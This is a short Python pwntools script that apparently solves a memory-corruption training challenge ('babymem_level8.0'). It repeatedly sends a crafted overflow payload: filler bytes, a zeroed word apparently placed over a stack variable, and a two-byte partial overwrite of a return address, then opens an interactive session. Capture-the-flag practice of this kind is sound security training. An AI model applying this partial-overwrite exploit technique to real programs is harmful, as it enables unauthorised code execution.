import pwn

while True:
	proc = pwn.process("/challenge/babymem_level8.0")
	proc.recvuntil("size:")
	proc.sendline("90")
	word_local_28 = pwn.p64(0x000000000000, endian='little')
	payload = b"a"*32 + word_local_28 + b"a"*48 + b"\xe6\x1a"
	proc.recvuntil("bytes)!")
	proc.send(payload)
	proc.interactive()
